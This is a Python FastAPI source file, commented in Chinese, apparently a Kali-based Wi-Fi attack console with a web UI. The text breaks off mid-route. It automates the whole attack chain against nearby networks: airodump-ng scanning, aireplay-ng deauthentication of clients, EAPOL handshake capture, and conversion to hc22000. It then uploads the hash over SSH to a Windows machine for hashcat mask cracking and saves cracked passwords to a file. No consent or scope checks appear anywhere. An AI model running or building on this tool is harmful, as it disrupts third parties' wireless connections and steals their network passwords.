#!/usr/bin/env python3
"""
WiFi 测试工具 - Kali 主控端
FastAPI + 内嵌 Web UI，绑定 0.0.0.0:8000
访问方式：
  - Kali 本地: http://127.0.0.1:8000
  - 局域网:   http://<kali-ip>:8000
  - 公网:     路由器端口映射 8000 -> Kali
"""

import subprocess
import threading
import time
import json
import os
import re
from pathlib import Path
from fastapi import FastAPI
from fastapi.responses import HTMLResponse, FileResponse
from pydantic import BaseModel
from typing import Optional, List, Dict, Any

# ============================================================
# 配置与存储
# ============================================================
BASE_DIR = Path(__file__).parent
CONFIG_FILE = BASE_DIR / "config.json"
KNOWN_FILE = BASE_DIR / "known_wifi.json"
ASSETS_DIR = BASE_DIR / "assets"
ASSETS_DIR.mkdir(exist_ok=True)
SCANS_DIR = BASE_DIR / "scans"
SCANS_DIR.mkdir(exist_ok=True)

DEFAULT_CONFIG = {
    "windows_host": "",
    "windows_user": "",
    "windows_password": "",
    "windows_port": 22,
    "hashcat_path": "C:\\Users\\7950x\\Desktop\\software i like\\wifi_windows_test\\hashcat-6.2.6\\hashcat.exe",
    "hashcat_mask": "?d?d?d?d?d?d?d?d",
    "hashcat_mode": "22000",
    "scan_duration": 20,
    "scan_refresh": 2,
    "scan_continuous": True,
    "deauth_rounds": 3,
    "deauth_frames": 10,
    "deauth_wait": 18,
}


def load_config() -> dict:
    if CONFIG_FILE.exists():
        try:
            return {**DEFAULT_CONFIG, **json.loads(CONFIG_FILE.read_text(encoding="utf-8"))}
        except Exception:
            pass
    return DEFAULT_CONFIG.copy()


def save_config(cfg: dict):
    CONFIG_FILE.write_text(json.dumps(cfg, indent=2, ensure_ascii=False), encoding="utf-8")


def load_known() -> list:
    if KNOWN_FILE.exists():
        try:
            return json.loads(KNOWN_FILE.read_text(encoding="utf-8"))
        except Exception:
            pass
    return []


def save_known(lst: list):
    KNOWN_FILE.write_text(json.dumps(lst, indent=2, ensure_ascii=False), encoding="utf-8")


def ssh_cmd(cfg: dict) -> list:
    """构造 SSH 命令前缀，有密码用 sshpass，无密码用免密"""
    base = ["ssh", "-o", "ConnectTimeout=10", "-o", "StrictHostKeyChecking=no"]
    pwd = cfg.get("windows_password", "").strip()
    if pwd:
        base = ["sshpass", "-p", pwd] + base
    port = str(cfg.get("windows_port", 22))
    return base + ["-p", port, f"{cfg['windows_user']}@{cfg['windows_host']}"]


def scp_cmd(cfg: dict) -> list:
    """构造 SCP 命令前缀"""
    base = ["scp", "-o", "ConnectTimeout=10", "-o", "StrictHostKeyChecking=no"]
    pwd = cfg.get("windows_password", "").strip()
    if pwd:
        base = ["sshpass", "-p", pwd] + base
    port = str(cfg.get("windows_port", 22))
    return base + ["-P", port]


# ============================================================
# 全局状态
# ============================================================
scan_state: Dict[str, Any] = {"status": "idle", "aps": [], "started_at": None, "duration": 0}
attack_state: Dict[str, Any] = {"status": "idle", "log": [], "result": None, "target": None}
state_lock = threading.Lock()
scan_stop_flag = False

# OUI 厂商数据库
_oui_db = {}
def load_oui_db():
    global _oui_db
    oui_file = "/usr/share/nmap/nmap-mac-prefixes"
    if not os.path.exists(oui_file):
        return
    try:
        with open(oui_file, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                parts = line.split(None, 1)
                if len(parts) == 2 and len(parts[0]) == 6:
                    _oui_db[parts[0].upper()] = parts[1]
    except Exception:
        pass

def lookup_mac_vendor(mac: str) -> str:
    if not mac or len(mac) < 8:
        return ""
    oui = mac.replace(":", "").replace("-", "")[:6].upper()
    return _oui_db.get(oui, "")

def is_random_mac(mac: str) -> bool:
    try:
        first_byte = int(mac.split(":")[0], 16)
        return (first_byte & 0x02) != 0
    except Exception:
        return False

# 启动时加载 OUI 数据库
load_oui_db()


def log_attack(msg: str):
    with state_lock:
        attack_state["log"].append(f"[{time.strftime('%H:%M:%S')}] {msg}")
        # 保留最近200条
        if len(attack_state["log"]) > 200:
            attack_state["log"] = attack_state["log"][-200:]


# ============================================================
# 扫描引擎
# ============================================================
def parse_airodump_csv(csv_file: str):
    """解析 airodump-ng CSV 文件，返回 (aps, stations)"""
    aps = []
    stations = []
    if not os.path.exists(csv_file):
        return aps, stations
    try:
        result = subprocess.run(["sudo", "cat", csv_file], capture_output=True, text=True)
        csv_content = result.stdout
    except Exception:
        return aps, stations
    lines = csv_content.strip().split("\n")
    section = None
    for line in lines:
        if line.startswith("BSSID,"):
            section = "ap"
            continue
        if line.startswith("Station MAC,"):
            section = "station"
            continue
        if not line.strip():
            continue
        parts = [x.strip() for x in line.split(",")]
        if section == "ap" and len(parts) >= 14 and parts[0] and parts[0] != "BSSID":
            bssid = parts[0]
            channel = parts[3] if len(parts) > 3 else ""
            privacy = parts[5] if len(parts) > 5 else ""
            cipher = parts[6] if len(parts) > 6 else ""
            power = parts[8] if len(parts) > 8 else ""
            essid = parts[13] if len(parts) > 13 else ""
            if essid and bssid:
                try:
                    pwr = int(power)
                except Exception:
                    pwr = -99
                aps.append({
                    "bssid": bssid, "essid": essid, "channel": channel,
                    "privacy": privacy, "cipher": cipher, "power": pwr,
                    "clients": [],
                })
        elif section == "station" and len(parts) >= 6 and parts[0] and parts[0] != "Station MAC":
            sta_mac = parts[0]
            sta_power = parts[3] if len(parts) > 3 else ""
            sta_packets = parts[4] if len(parts) > 4 else "0"
            sta_bssid = parts[5] if len(parts) > 5 else ""
            try:
                sta_pwr = int(sta_power)
            except Exception:
                sta_pwr = -99
            try:
                sta_pkts = int(sta_packets)
            except Exception:
                sta_pkts = 0
            if sta_bssid and sta_bssid != "(not associated)":
                stations.append({
                    "mac": sta_mac,
                    "power": sta_pwr,
                    "packets": sta_pkts,
                    "bssid": sta_bssid,
                    "vendor": lookup_mac_vendor(sta_mac),
                    "is_random": is_random_mac(sta_mac),
                })
    return aps, stations


def run_scan(duration: int = 20, continuous: bool = False):
    global scan_state, scan_stop_flag
    scan_stop_flag = False
    with state_lock:
        scan_state = {"status": "scanning", "aps": [], "started_at": time.time(), "duration": duration, "source": "live", "continuous": continuous}
    start_time = scan_state["started_at"]

    try:
        subprocess.run(["sudo", "pkill", "-f", "airodump-ng"], capture_output=True)
        time.sleep(2)

        tmp_prefix = "/tmp/wifiscan_tool"
        subprocess.run(["sudo", "rm", "-f", f"{tmp_prefix}-01.csv"], capture_output=True)

        proc = subprocess.Popen(
            ["sudo", "airodump-ng", "wlan1mon", "--band", "ab", "--output-format", "csv", "-w", tmp_prefix],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        # 实时刷新：每隔 refresh_interval 秒读取一次 CSV
        config = load_config()
        refresh_interval = max(1, int(config.get("scan_refresh", 2)))
        elapsed = 0
        while True:
            if scan_stop_flag:
                break
            if not continuous and elapsed >= duration:
                break
            time.sleep(refresh_interval)
            elapsed += refresh_interval
            csv_file = f"{tmp_prefix}-01.csv"
            # 先复制再解析，避免读到 airodump-ng 正在写入的不完整 CSV
            subprocess.run(["sudo", "cp", csv_file, csv_file + ".rt"], capture_output=True)
            aps_rt, stations_rt = parse_airodump_csv(csv_file + ".rt")
            for ap in aps_rt:
                ap["clients"] = [s for s in stations_rt if s["bssid"].lower() == ap["bssid"].lower()]
                ap["client_count"] = len(ap["clients"])
            aps_rt.sort(key=lambda x: (x["client_count"] > 0, x["power"]), reverse=True)
            with state_lock:
                scan_state["aps"] = aps_rt
                scan_state["elapsed"] = elapsed

        proc.terminate()
        try:
            proc.wait(timeout=5)
        except Exception:
            proc.kill()
        time.sleep(2)

        # 最终解析
        csv_file = f"{tmp_prefix}-01.csv"
        aps, stations = parse_airodump_csv(csv_file)

        # 把客户端关联到对应 AP
        for ap in aps:
            ap["clients"] = [s for s in stations if s["bssid"].lower() == ap["bssid"].lower()]
            ap["client_count"] = len(ap["clients"])

        aps.sort(key=lambda x: (x["client_count"] > 0, x["power"]), reverse=True)

        # 保存扫描结果到历史记录（用开始时间做文件名，记录开始/结束时间和真实时长）
        actual_duration = int(time.time() - start_time)
        started_str = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(start_time))
        ended_str = time.strftime("%Y-%m-%d %H:%M:%S")
        scan_ts = time.strftime("%Y%m%d_%H%M%S", time.localtime(start_time))
        scan_file = SCANS_DIR / f"scan_{scan_ts}.json"
        scan_record = {
            "timestamp": ended_str,
            "started_at": started_str,
            "ended_at": ended_str,
            "duration": actual_duration,
            "ap_count": len(aps),
            "aps": aps,
        }
        try:
            with open(scan_file, "w", encoding="utf-8") as f:
                json.dump(scan_record, f, ensure_ascii=False, indent=2)
        except Exception:
            pass

        with state_lock:
            scan_state = {"status": "done", "aps": aps, "started_at": start_time, "duration": actual_duration, "source": "live", "scan_file": scan_file.name}
    except Exception as e:
        with state_lock:
            scan_state = {"status": "error", "aps": [], "error": str(e), "started_at": start_time, "duration": int(time.time() - start_time)}


# ============================================================
# 攻击引擎
# ============================================================
def run_attack(bssid: str, channel: int, essid: str):
    global attack_state
    with state_lock:
        attack_state = {"status": "starting", "log": [], "result": None, "target": {"bssid": bssid, "channel": channel, "essid": essid}}

    client_mac = None
    try:
        config = load_config()

        # ---- 阶段1: 扫描客户端 ----
        with state_lock:
            attack_state["status"] = "scanning_clients"
        log_attack(f"目标: {essid} ({bssid}) 频道 {channel}")
        log_attack("扫描目标频道，寻找关联客户端...")

        tmp_prefix = "/tmp/wifi_attack_scan"
        subprocess.run(["sudo", "rm", "-f", f"{tmp_prefix}-01.csv"], capture_output=True)
        proc = subprocess.Popen(
            ["sudo", "airodump-ng", "wlan1mon", "-c", str(channel), "--bssid", bssid,
             "--output-format", "csv", "-w", tmp_prefix],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        time.sleep(15)
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except Exception:
            proc.kill()
        time.sleep(2)

        csv_file = f"{tmp_prefix}-01.csv"
        if os.path.exists(csv_file):
            result = subprocess.run(["sudo", "cat", csv_file], capture_output=True, text=True)
            lines = result.stdout.strip().split("\n")
            in_station = False
            for line in lines:
                if line.startswith("Station MAC,"):
                    in_station = True
                    continue
                if in_station and line.strip():
                    parts = [x.strip() for x in line.split(",")]
                    if len(parts) >= 6 and parts[0] and parts[5].upper() == bssid.upper():
                        client_mac = parts[0]
                        log_attack(f"找到客户端: {client_mac}")
                        break

        if not client_mac:
            log_attack("未找到关联客户端，将使用广播 deauth（效果可能较差）")

        # ---- 阶段2: 抓包 + 多轮 deauth ----
        with state_lock:
            attack_state["status"] = "capturing"
        log_attack("启动抓包...")

        cap_prefix = "/tmp/wifi_attack_cap"
        subprocess.run(["sudo", "rm", "-f", f"{cap_prefix}-01.cap"], capture_output=True)

        proc = subprocess.Popen(
            ["sudo", "airodump-ng", "wlan1mon", "-c", str(channel), "--bssid", bssid,
             "-w", cap_prefix, "--output-format", "cap"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            preexec_fn=os.setsid,
        )
        time.sleep(5)

        rounds = int(config.get("deauth_rounds", 3))
        frames = int(config.get("deauth_frames", 10))
        wait_time = int(config.get("deauth_wait", 18))

        got_handshake = False
        for r in range(1, rounds + 1):
            with state_lock:
                attack_state["status"] = f"deauth_round_{r}"
            log_attack(f"第 {r}/{rounds} 轮 deauth（{frames} 帧）...")

            if client_mac:
                subprocess.run(
                    ["sudo", "aireplay-ng", "--deauth", str(frames),
                     "-a", bssid, "-c", client_mac, "wlan1mon"],
                    capture_output=True, timeout=30,
                )
            else:
                subprocess.run(
                    ["sudo", "aireplay-ng", "--deauth", str(frames), "-a", bssid, "wlan1mon"],
                    capture_output=True, timeout=30,
                )

            log_attack(f"等待 {wait_time} 秒，客户端重连中...")
            time.sleep(wait_time)

            cap_file = f"{cap_prefix}-01.cap"
            if os.path.exists(cap_file):
                r = subprocess.run(
                    ["sudo", "tshark", "-r", cap_file, "-Y", "eapol"],
                    capture_output=True, text=True,
                )
                eapol_count = len([x for x in r.stdout.strip().split("\n") if x.strip()])
                log_attack(f"当前 EAPOL 帧数: {eapol_count}")
                if eapol_count >= 2:
                    got_handshake = True
                    log_attack("抓到握手！停止后续 deauth。")
                    break

        log_attack("停止抓包...")
        try:
            os.killpg(os.getpgid(proc.pid), 15)
            proc.wait(timeout=5)
        except Exception:
            try:
                os.killpg(os.getpgid(proc.pid), 9)
            except Exception:
                pass
        time.sleep(2)

        # 最终确认
        cap_file = f"{cap_prefix}-01.cap"
        if not got_handshake and os.path.exists(cap_file):
            r = subprocess.run(["sudo", "tshark", "-r", cap_file, "-Y", "eapol"],
                               capture_output=True, text=True)
            if len([x for x in r.stdout.strip().split("\n") if x.strip()]) >= 2:
                got_handshake = True

        if not got_handshake:
            with state_lock:
                attack_state["status"] = "failed"
                attack_state["result"] = {"error": "未抓到有效 EAPOL 握手。建议：增加 deauth 轮数、确认客户端在线、或换信号更强的位置。"}
            return

        # ---- 阶段3: 转换哈希 ----
        with state_lock:
            attack_state["status"] = "converting"
        log_attack("转换为 hc22000 格式...")

        hash_file = "/tmp/wifi_attack_hash.hc22000"
        subprocess.run(["sudo", "rm", "-f", hash_file], capture_output=True)
        subprocess.run(["sudo", "hcxpcapngtool", "-o", hash_file, cap_file],
                       capture_output=True, text=True, timeout=60)

        if not os.path.exists(hash_file) or os.path.getsize(hash_file) == 0:
            with state_lock:
                attack_state["status"] = "failed"
                attack_state["result"] = {"error": "哈希转换失败（文件为空）。可能握手不完整，重试一次。"}
            return

        hash_size = os.path.getsize(hash_file)
        log_attack(f"哈希文件生成成功，大小 {hash_size} 字节")

        # ---- 归档到资产目录 ----
        import re as _re
        _ts = time.strftime("%Y%m%d_%H%M%S")
        _safe_ssid = _re.sub(r'[^\w\-]', '_', essid)
        _safe_bssid = bssid.replace(":", "")
        _asset_cap = ASSETS_DIR / f"{_safe_ssid}_{_safe_bssid}_{_ts}.cap"
        _asset_hash = ASSETS_DIR / f"{_safe_ssid}_{_safe_bssid}_{_ts}.hc22000"
        subprocess.run(["sudo", "cp", cap_file, str(_asset_cap)], capture_output=True)
        subprocess.run(["sudo", "cp", hash_file, str(_asset_hash)], capture_output=True)
        subprocess.run(["sudo", "chmod", "644", str(_asset_cap), str(_asset_hash)], capture_output=True)
        log_attack(f"已归档到资产目录: {_asset_cap.name}, {_asset_hash.name}")

        # 复制到非sudo可读位置
        subprocess.run(["sudo", "cp", hash_file, "/tmp/wifi_hash_copy.hc22000"], capture_output=True)
        subprocess.run(["sudo", "chmod", "644", "/tmp/wifi_hash_copy.hc22000"], capture_output=True)

        # ---- 阶段4: 上传 Windows + Hashcat 破解 ----
        with state_lock:
            attack_state["status"] = "uploading"

        win_host = config.get("windows_host", "").strip()
        win_user = config.get("windows_user", "").strip()
        win_port = str(config.get("windows_port", 22))
        hashcat_path = config.get("hashcat_path", "C:\\Users\\7950x\\Desktop\\software i like\\wifi_windows_test\\hashcat-6.2.6\\hashcat.exe")
        mask = config.get("hashcat_mask", "?d?d?d?d?d?d?d?d")
        mode = config.get("hashcat_mode", "22000")

        if not win_host or not win_user:
            with state_lock:
                attack_state["status"] = "failed"
                attack_state["result"] = {"error": "未配置 Windows 计算节点。请在「配置」页面填写 Windows IP 和用户名。"}
            return

        log_attack(f"上传哈希到 {win_user}@{win_host}...")

        # 工作目录 = hashcat.exe 上两级（wifi_windows_test 目录）
        _hp = hashcat_path.replace("\\", "/")
        work_dir = _hp.rsplit("/", 2)[0]
        hashcat_dir = _hp.rsplit("/", 1)[0]
        hashcat_exe = _hp.rsplit("/", 1)[-1]
        remote_hash = f"{hashcat_dir}/wifi_attack_hash.hc22000"
        remote_hash_rel = ".\\wifi_attack_hash.hc22000"
        r = subprocess.run(
            scp_cmd(config) + ["/tmp/wifi_hash_copy.hc22000", f"{win_user}@{win_host}:{remote_hash}"],
            capture_output=True, text=True, timeout=30,
        )
        if r.returncode != 0:
            with state_lock:
                attack_state["status"] = "failed"
                attack_state["result"] = {"error": f"SCP 上传失败: {r.stderr.strip()[:200]}"}
            return

        log_attack("上传成功，启动 Hashcat...")

        with state_lock:
            attack_state["status"] = "cracking"

        # 直接前台运行 hashcat（Windows SSH 非交互式会话中后台进程会立刻退出，必须前台运行）
        hashcat_cmd = (
            f"cd '{hashcat_dir}'; "
            f".\\{hashcat_exe} -a 3 -m {mode} {remote_hash_rel} {mask} -D 2 --potfile-disable"
        )
        log_attack("Hashcat 运行中（GPU 加速）...")
        try:
            r = subprocess.run(
                ssh_cmd(config) + ["powershell -Command \"" + hashcat_cmd.replace("\"", "\\\"") + "\""],
                capture_output=True, text=True, timeout=300,
            )
            output = r.stdout + r.stderr
        except subprocess.TimeoutExpired as e:
            output = (e.stdout or "") + (e.stderr or "")
            log_attack("Hashcat 运行超时（300秒）")
            with state_lock:
                attack_state["status"] = "error"
                attack_state["result"] = {"error": "Hashcat 运行超时（300秒），掩码空间可能太大"}
            try:
                subprocess.run(ssh_cmd(config) + [f'del "{remote_hash}" 2>nul'], capture_output=True, timeout=10)
            except Exception:
                pass
            return

        # 解析结果
        password = None
        if "Cracked" in output:
            for line in output.split("\n"):
                line = line.strip()
                if essid in line and ":" in line:
                    parts = line.split(":")
                    if len(parts) >= 5:
                        password = parts[-1].strip()
                        break
            if not password:
                for line in output.split("\n"):
                    line = line.strip()
                    if line.startswith("WPA*") or (bssid.replace(":", "").lower() in line.lower() and ":" in line):
                        parts = line.split(":")
                        if len(parts) >= 5:
                            password = parts[-1].strip()
                            break
        elif "Exhausted" in output:
            log_attack("掩码未命中，未找到密码")
            with state_lock:
                attack_state["status"] = "exhausted"
                attack_state["result"] = {"error": "掩码未命中。请尝试更大的掩码空间或使用字典。"}
            try:
                subprocess.run(ssh_cmd(config) + [f'del "{remote_hash}" 2>nul'], capture_output=True, timeout=10)
            except Exception:
                pass
            return

        # 清理远程临时文件
        try:
            subprocess.run(ssh_cmd(config) + [f'del "{remote_hash}" 2>nul'], capture_output=True, timeout=10)
        except Exception:
            pass

        # ---- 阶段5: 保存结果 ----
        if password:
            log_attack(f"破解成功！密码: {password}")

            known = load_known()
            known = [k for k in known if k["bssid"].lower() != bssid.lower()]
            known.append({
                "essid": essid,
                "bssid": bssid,
                "channel": channel,
                "password": password,
                "client": client_mac or "",
                "cracked_at": time.strftime("%Y-%m-%d %H:%M:%S"),
            })
            save_known(known)

            with state_lock:
                attack_state["status"] = "success"
                attack_state["result"] = {"essid": essid, "bssid": bssid, "password": password}
        else:
            log_attack("未破解（掩码空间已耗尽或超时）。可尝试更长掩码或字典攻击。")
            with state_lock:
                attack_state["status"] = "exhausted"
                attack_state["result"] = {"error": "掩码未命中。建议增加掩码长度、使用字典攻击，或确认密码复杂度。"}

    except Exception as e:
        log_attack(f"发生错误: {str(e)}")
        with state_lock:
            attack_state["status"] = "error"
            attack_state["result"] = {"error": str(e)[:300]}


def run_attack_from_asset(filename: str):
    """从资产文件直接发起破解（跳过抓包）"""
    global attack_state
    with state_lock:
        attack_state = {"status": "starting", "log": [], "result": None, "target": {"bssid": "", "channel": 0, "essid": ""}}

    try:
        config = load_config()

        # 检查文件存在
        asset_path = ASSETS_DIR / os.path.basename(filename)
        if not asset_path.exists():
            with state_lock:
                attack_state["status"] = "failed"
                attack_state["result"] = {"error": f"资产文件不存在: {filename}"}
            return
        if not asset_path.suffix == ".hc22000":
            with state_lock:
                attack_state["status"] = "failed"
                attack_state["result"] = {"error": "只有 .hc22000 哈希文件可以直接破解，.cap 文件需要先转换"}
            return

        # 从文件名解析 essid 和 bssid
        m = re.match(r"^(.+)_([0-9A-Fa-f]{12})_(\d{8}_\d{6})\.hc22000$", asset_path.name)
        if m:
            essid = m.group(1).replace("_", " ")
            bssid = ":".join([m.group(2)[i:i+2] for i in range(0, 12, 2)])
        else:
            essid = asset_path.stem
            bssid = "unknown"
        channel = 0
        client_mac = ""

        log_attack(f"从资产破解: {essid} ({bssid})")
        log_attack(f"资产文件: {asset_path.name} ({asset_path.stat().st_size} 字节)")

        # 复制到 /tmp
        subprocess.run(["cp", str(asset_path), "/tmp/wifi_hash_copy.hc22000"], capture_output=True)
        subprocess.run(["chmod", "644", "/tmp/wifi_hash_copy.hc22000"], capture_output=True)

        # ---- 上传 Windows + Hashcat 破解 ----
        with state_lock:
            attack_state["status"] = "uploading"
            attack_state["target"] = {"bssid": bssid, "channel": channel, "essid": essid}

        win_host = config.get("windows_host", "").strip()
        win_user = config.get("windows_user", "").strip()
        win_port = str(config.get("windows_port", 22))
        hashcat_path = config.get("hashcat_path", "")
        mask = config.get("hashcat_mask", "?d?d?d?d?d?d?d?d")
        mode = config.get("hashcat_mode", "22000")

        if not win_host or not win_user:
            with state_lock:
                attack_state["status"] = "failed"
                attack_state["result"] = {"error": "未配置 Windows 计算节点。请在「配置」页面填写 Windows IP 和用户名。"}
            return

        log_attack(f"上传哈希到 {win_user}@{win_host}...")

        _hp = hashcat_path.replace("\\", "/")
        hashcat_dir = _hp.rsplit("/", 1)[0]
        hashcat_exe = _hp.rsplit("/", 1)[-1]
        remote_hash = f"{hashcat_dir}/wifi_attack_hash.hc22000"
        remote_hash_rel = ".\\wifi_attack_hash.hc22000"

        r = subprocess.run(
            scp_cmd(config) + ["/tmp/wifi_hash_copy.hc22000", f"{win_user}@{win_host}:{remote_hash}"],
            capture_output=True, text=True, timeout=30,
        )
        if r.returncode != 0:
            with state_lock:
                attack_state["status"] = "failed"
                attack_state["result"] = {"error": f"SCP 上传失败: {r.stderr.strip()[:200]}"}
            return

        log_attack("上传成功，启动 Hashcat...")
        with state_lock:
            attack_state["status"] = "cracking"

        hashcat_cmd = (
            f"cd '{hashcat_dir}'; "
            f".\\{hashcat_exe} -a 3 -m {mode} {remote_hash_rel} {mask} -D 2 --potfile-disable"
        )
        log_attack("Hashcat 运行中（GPU 加速）...")
        try:
            r = subprocess.run(
                ssh_cmd(config) + ["powershell -Command \"" + hashcat_cmd.replace("\"", "\\\"") + "\""],
                capture_output=True, text=True, timeout=300,
            )
            output = r.stdout + r.stderr
        except subprocess.TimeoutExpired as e:
            output = (e.stdout or "") + (e.stderr or "")
            log_attack("Hashcat 运行超时（300秒）")
            with state_lock:
                attack_state["status"] = "error"
                attack_state["result"] = {"error": "Hashcat 运行超时（300秒），掩码空间可能太大"}
            try:
                subprocess.run(ssh_cmd(config) + [f'del "{remote_hash}" 2>nul'], capture_output=True, timeout=10)
            except Exception:
                pass
            return

        password = None
        if "Cracked" in output:
            for line in output.split("\n"):
                line = line.strip()
                if essid in line and ":" in line:
                    parts = line.split(":")
                    if len(parts) >= 5:
                        password = parts[-1].strip()
                        break
            if not password:
                for line in output.split("\n"):
                    line = line.strip()
                    if line.startswith("WPA*") or (bssid.replace(":", "").lower() in line.lower() and ":" in line):
                        parts = line.split(":")
                        if len(parts) >= 5:
                            password = parts[-1].strip()
                            break
        elif "Exhausted" in output:
            log_attack("掩码未命中，未找到密码")
            with state_lock:
                attack_state["status"] = "exhausted"
                attack_state["result"] = {"error": "掩码未命中。请尝试更大的掩码空间或使用字典。"}
            try:
                subprocess.run(ssh_cmd(config) + [f'del "{remote_hash}" 2>nul'], capture_output=True, timeout=10)
            except Exception:
                pass
            return

        try:
            subprocess.run(ssh_cmd(config) + [f'del "{remote_hash}" 2>nul'], capture_output=True, timeout=10)
        except Exception:
            pass

        if password:
            log_attack(f"破解成功！密码: {password}")
            known = load_known()
            known = [k for k in known if k["bssid"].lower() != bssid.lower()]
            known.append({
                "essid": essid,
                "bssid": bssid,
                "channel": channel,
                "password": password,
                "client": client_mac or "",
                "cracked_at": time.strftime("%Y-%m-%d %H:%M:%S"),
            })
            save_known(known)
            with state_lock:
                attack_state["status"] = "success"
                attack_state["result"] = {"essid": essid, "bssid": bssid, "password": password}
        else:
            log_attack("未破解（掩码空间已耗尽或超时）。")
            with state_lock:
                attack_state["status"] = "exhausted"
                attack_state["result"] = {"error": "掩码未命中。建议增加掩码长度、使用字典攻击，或确认密码复杂度。"}

    except Exception as e:
        log_attack(f"发生错误: {str(e)}")
        with state_lock:
            attack_state["status"] = "error"
            attack_state["result"] = {"error": str(e)[:300]}



# ============================================================
# FastAPI 路由
# ============================================================
app = FastAPI(title="WiFi Tool")


class ConfigModel(BaseModel):
    windows_host: str = ""
    windows_user: str = ""
    windows_password: str = ""
    windows_port: int = 22
    hashcat_path: str = "C:\\Users\\7950x\\Desktop\\software i like\\wifi_windows_test\\hashcat-6.2.6\\hashcat.exe"
    hashcat_mask: str = "?d?d?d?d?d?d?d?d"
    hashcat_mode: str = "22000"
    scan_duration: int = 20
    scan_refresh: int = 2
    scan_continuous: bool = True
    deauth_rounds: int = 3
    deauth_frames: int = 10
    deauth_wait: int = 18


class AttackModel(BaseModel):
    bssid: str
    channel: int
    essid: str


@app.get("/", response_class=HTMLResponse)
async def index():
    return HTML_PAGE


@app.get("/api/config")
async def get_config():
    return load_config()


@app.post("/api/config")
async def post_config(cfg: ConfigModel):
    save_config(cfg.dict())
    return {"ok": True}



@app.post("/api/worker/test")
async def test_worker(cfg: ConfigModel):
    """测试 Windows 计算节点连通性和 Hashcat 可用性"""
    results = []
    def add_step(name, ok, detail=""):
        results.append({"name": name, "ok": ok, "detail": detail})
    c = cfg.dict()
    host = c["windows_host"].strip()
    user = c["windows_user"].strip()
    port = str(c.get("windows_port") or 22)
    hashcat_path = c["hashcat_path"].strip()
    if not host:
        add_step("配置检查", False, "Windows IP 未填写")
        return {"ok": False, "results": results}
    if not user:
        add_step("配置检查", False, "Windows 用户名未填写")
        return {"ok": False, "results": results}
    auth_type = "密码认证" if c.get("windows_password", "").strip() else "免密认证"
    add_step("配置检查", True, f"{user}@{host}:{port}（{auth_type}）")
    # SSH 连通性
    try:
        r = subprocess.run(ssh_cmd(c) + ["whoami"], capture_output=True, text=True, timeout=15)
        if r.returncode == 0 and r.stdout.strip():
            add_step("SSH 连接", True, f"登录用户: {r.stdout.strip()}")
        else:
            err = r.stderr.strip()[:200] or "返回码非0"
            add_step("SSH 连接", False, err)
            return {"ok": False, "results": results}
    except subprocess.TimeoutExpired:
        add_step("SSH 连接", False, "连接超时（10秒），请检查 IP、端口、防火墙和密码")
        return {"ok": False, "results": results}
    except Exception as e:
        add_step("SSH 连接", False, str(e)[:200])
        return {"ok": False, "results": results}
    # 系统信息
    try:
        r = subprocess.run(ssh_cmd(c) + [
            "powershell -Command \"[System.Environment]::OSVersion.VersionString; (Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB\""],
            capture_output=True, text=True, timeout=15)
        if r.returncode == 0:
            lines = [x.strip() for x in r.stdout.strip().split("\n") if x.strip()]
            info = f"Windows {lines[0]}" if lines else "未知"
            if len(lines) > 1:
                try: info += f"，内存 {float(lines[1]):.1f} GB"
                except Exception: pass
            add_step("系统信息", True, info)
        else:
            add_step("系统信息", True, "（获取失败，不影响使用）")
    except Exception:
        add_step("系统信息", True, "（获取失败，不影响使用）")
    # GPU 检测
    try:
        r = subprocess.run(ssh_cmd(c) + ["nvidia-smi --query-gpu=name,memory.total --format=csv,noheader"],
                           capture_output=True, text=True, timeout=15)
        if r.returncode == 0 and r.stdout.strip():
            add_step("NVIDIA GPU", True, r.stdout.strip().split("\n")[0].strip())
        else:
            add_step("NVIDIA GPU", False, "未检测到 NVIDIA GPU，Hashcat 将无法 GPU 加速")
    except Exception:
        add_step("NVIDIA GPU", False, "检测失败")
    # Hashcat 文件
    if not hashcat_path:
        add_step("Hashcat 路径", False, "未配置 Hashcat 路径")
        return {"ok": False, "results": results}
    _hp = hashcat_path.replace("\\", "/")
    hashcat_dir = _hp.rsplit("/", 1)[0]
    hashcat_exe = _hp.rsplit("/", 1)[-1]
    try:
        r = subprocess.run(ssh_cmd(c) + [
            f"powershell -Command \"if (Test-Path '{hashcat_path}') {{ Write-Output 'EXISTS' }} else {{ Write-Output 'NOT_FOUND' }}\""],
            capture_output=True, text=True, timeout=15)
        if "EXISTS" in r.stdout:
            add_step("Hashcat 文件", True, hashcat_path)
        else:
            add_step("Hashcat 文件", False, f"文件不存在: {hashcat_path}")
            return {"ok": False, "results": results}
    except Exception as e:
        add_step("Hashcat 文件", False, str(e)[:200])
        return {"ok": False, "results": results}
    # Hashcat 版本
    try:
        r = subprocess.run(ssh_cmd(c) + [
            f"powershell -Command \"cd '{hashcat_dir}'; .\\{hashcat_exe} --version\""],
            capture_output=True, text=True, timeout=20)
        version = r.stdout.strip().split("\n")[0].strip() if r.stdout.strip() else ""
        if version:
            add_step("Hashcat 运行", True, f"版本 {version}")
        else:
            add_step("Hashcat 运行", False, (r.stderr.strip() or "执行失败")[:200])
            return {"ok": False, "results": results}
    except Exception as e:
        add_step("Hashcat 运行", False, str(e)[:200])
        return {"ok": False, "results": results}
    all_ok = all(r["ok"] for r in results)
    return {"ok": all_ok, "results": results}
@app.post("/api/scan/start")
async def start_scan():
    config = load_config()
    continuous = config.get("scan_continuous", False)
    dur = 0 if continuous else int(config.get("scan_duration", 20))
    t = threading.Thread(target=run_scan, args=(dur, continuous), daemon=True)
    t.start()
    return {"ok": True}


@app.post("/api/scan/stop")
async def stop_scan():
    global scan_stop_flag
    scan_stop_flag = True
    return {"ok": True}


@app.get("/api/scan/status")
async def scan_status():
    with state_lock:
        return dict(scan_state)


@app.get("/api/scans")
async def list_scans():
    """列出历史扫描记录"""
    scans = []
    for f in sorted(SCANS_DIR.glob("scan_*.json"), key=lambda x: x.stat().st_mtime, reverse=True):
        try:
            with open(f, "r", encoding="utf-8") as fh:
                data = json.load(fh)
            scans.append({
                "filename": f.name,
                "timestamp": data.get("timestamp", ""),
                "duration": data.get("duration", 0),
                "ap_count": data.get("ap_count", 0),
                "size_kb": round(f.stat().st_size / 1024, 1),
            })
        except Exception:
            continue
    return {"scans": scans}


@app.get("/api/scans/{filename}")
